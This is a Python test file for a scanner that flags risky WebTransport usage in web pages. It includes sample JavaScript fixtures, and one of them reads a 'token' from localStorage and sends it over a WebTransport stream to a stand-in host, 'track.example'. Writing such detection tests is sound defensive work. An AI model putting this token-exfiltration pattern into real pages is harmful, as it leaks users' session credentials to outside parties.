"""Tests for WebTransportSecurityScanner."""
from unittest.mock import MagicMock
from tblue.scanner.webtransport_security import WebTransportSecurityScanner


def _scanner():
    s = WebTransportSecurityScanner.__new__(WebTransportSecurityScanner)
    s.http = MagicMock()
    return s


def _resp(status=200, body="", headers=None):
    r = MagicMock()
    r.status_code = status
    r.text = body
    r.headers = headers or {}
    return r


class TestURLFromParam:
    def test_url_from_param_fails(self):
        s = _scanner()
        body = "new WebTransport(searchParams.get('server'))"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "webtransport_url_from_param" in types


class TestSensitiveExfil:
    def test_sensitive_data_exfil_fails(self):
        s = _scanner()
        body = "const wt = new WebTransport('https://track.example')\nconst data = localStorage.getItem('token')\nwt.createUnidirectionalStream().then(w => w.write(data))"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "webtransport_sensitive_data_exfil" in types


class TestExternalURL:
    def test_external_endpoint_warns(self):
        s = _scanner()
        body = "const transport = new WebTransport('https://external.tracker.io/collect')"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "webtransport_external_endpoint" in types


class TestNotUsed:
    def test_no_webtransport_passes(self):
        s = _scanner()
        s.http.get.return_value = _resp(200, "<html>Normal page</html>")
        results = s.scan("http://example.com")
        assert results[0]["type"] == "webtransport_not_used"

    def test_no_response_passes(self):
        s = _scanner()
        s.http.get.return_value = None
        results = s.scan("http://example.com")
        assert results[0]["status"] == "PASS"
